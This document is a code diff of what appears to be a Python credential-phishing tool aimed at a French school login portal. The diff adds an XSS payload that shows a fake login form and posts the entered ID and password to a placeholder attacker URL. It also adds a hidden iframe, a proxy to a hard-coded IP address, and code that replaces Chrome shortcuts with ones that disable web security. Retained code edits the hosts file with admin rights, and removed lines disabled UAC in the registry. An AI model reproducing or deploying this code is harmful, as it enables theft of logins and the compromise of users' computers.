@@ -24,24 +24,22 @@ def callPage(school):
     code = BeautifulSoup(code, "html.parser")
     for a in code.findAll('a'):
         href = a["href"]
+        original = href
         if href[:15] == "https://bulrezo":
-            evil_link = "{}/start/authentNew?lp=x265y110message<P>Connexion+avec+la+BD+établie+le+10-8-2019+à+18h01.<%2FP>%0D%0A&login=</h3><style>h3,%20p%7Bdisplay:%20none%7D</style></div>%20<div%20id='RightZone'>%20<br><br><br>%20<h3%20style='display:%20inline'><img%20src='https://bulrezo17.pythomium.net/static/password64.gif'%20class='icon'>%20Une%20authentification%20est%20requise<br>pour%20accéder%20à%20ce%20site.</h3>%20<h4><br><br><br>Veuillez%20donc%20SVP%20fournir%20ci-dessous%20:<br><br>%20Votre%20identifiant%20:%20<input%20type='text'%20name='login'%20maxlength='15'%20size='8'>%20<br><br>%20Votre%20mot%20de%20passe%20:%20<input%20type='password'%20name='lp'%20maxlength='15'%20size='14'>%20<br><br>%20<input%20type='submit'%20class='button'%20value='%20OK%20'></h4>%20</div><style>".format('/'.join(href.split('/')[:-1]))
-            a["href"] = evil_link 
+            evil_link = """/start/authentNew?lp=x265y110message<P>Connexion+avec+la+BD+établie+le+10-8-2019+à+18h01.</P>%0D%0A&login=<script>function send_info(form) {%0Aif (form.lp.value != '') {%0Aform.action='http://YOUR-URL.com'%3B%0Areturn true%3B%0A} else {alert('Le mot de passe est indispensable !')%3B%0Aform.lp.focus()%3B%0Areturn false%3B%0A}%0A}%0A</script></h3><style>h3, p{display: none}</style></div><div id='RightZone'><br><br><br><h3 style='display: inline'><img src='https://bulrezo17.pythomium.net/static/password64.gif' class='icon'>Une authentification est requise<br>pour accéder à ce site.</h3><form onsubmit='send_info(this)'><h4><br><br><br>Veuillez donc SVP fournir ci-dessous :<br><br>Votre identifiant : <input type='text' name='login' maxlength='15' size='8'><br><br>Votre mot de passe : <input type='password' name='lp' maxlength='15' size='14'><br><br><input type='submit' class='button' value=' OK '></h4></form></div><style>"""
+            a["href"] = '/'.join(href.split('/')[:-1]) + evil_link 
 
-    return str(code)
+    return f"{str(code)}<iframe src='{original}' style='width:0;height:0;border:0; border:none;'></iframe>"
     
 @app.errorhandler(404)
 def redirect_real(page):
     # 81.28.97.146
+    if '/'.join(request.base_url.split('/')[3:]).split('.')[-1] == "gif":
+        return urlopen(f"http://81.28.97.146/{'/'.join(request.base_url.split('/')[3:])}").read()
     return f"<iframe style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999' src='http://81.28.97.146/{'/'.join(request.base_url.split('/')[3:])}'></iframe>"
 
-def verify_uac() -> bool:
-    flag = check_output("reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA".split(' '))
-    flag = flag.decode().split("    ")
-    return not int(flag[-1][:-4], 16) 
-
 def verify_payload() -> bool:
-    with open(f"{os.environ['HOMEDRIVE']}\\Windows\\System32\\drivers\\etc\\hosts", 'r') as hosts:
+    with open(f"{os.environ['HOMEDRIVE']}\\Windows\\System32\\drivers\\etc\\hosts", 'r') as hosts: 
         for host in hosts.readlines():
             if host[0] != '#' and len(host) > 1 and host.split(' ')[1] == "pythomium.net":
                 return True 
@@ -51,10 +49,41 @@ def run_as_admin(payload: str):
     payload = f"powershell.exe Start-Process cmd '{payload}' -Verb runas"
     call(payload.split(' '))
 
+def create_chrome_shortcut(dest: str):
+    with open("shortcut.vbs", 'w') as script:
+        script.write(f"""Set objShell = WScript.CreateObject("WScript.Shell")
+        Set lnk = objShell.CreateShortcut("{dest}")
+   
+        lnk.TargetPath = "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
+        lnk.Arguments = "--args --disable-web-security --disable-xss-auditor"
+        lnk.Description = "Acceder a Internet"
+        lnk.IconLocation = "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe, 0"
+        lnk.WindowStyle = "1"
+        lnk.WorkingDirectory = "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
+        lnk.Save
+        """)
+    call(["wscript", f"{os.getcwd()}\\shortcut.vbs"])
+    os.remove("shortcut.vbs")
+
+def create_shortcut(path: str):
+    os.remove(f"{os.environ['PUBLIC']}\\Desktop\\Google Chrome.lnk")
+    os.remove(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\Google Chrome.lnk")
+
+    if os.path.isfile(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk"):
+        os.remove(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk")
+
+    create_chrome_shortcut(f"{os.environ['HOMEDRIVE']}{os.environ['HOMEPATH']}\\Desktop\\Google Chrome.lnk")
+    create_chrome_shortcut(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk")
+    create_chrome_shortcut(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\Google Chrome.lnk")
+
+def change_chrome():
+    path = f"{os.environ['ProgramFiles(x86)']}\\Google\\Chrome\\Application"
+    if os.path.isdir(path):
+        if os.path.isfile(f"{os.environ['PUBLIC']}\\Desktop\\Google Chrome.lnk"):
+            create_shortcut(path)
+
 if __name__ == "__main__":
-    if not verify_uac():
-        run_as_admin("/K reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-        call(["shutdown", "-r", "-t", "0"])
+    change_chrome()
     if not verify_payload():
         run_as_admin("/C echo 127.0.0.1 pythomium.net >>%HOMEDRIVE%\\Windows\\System32\\drivers\\etc\\hosts")
     
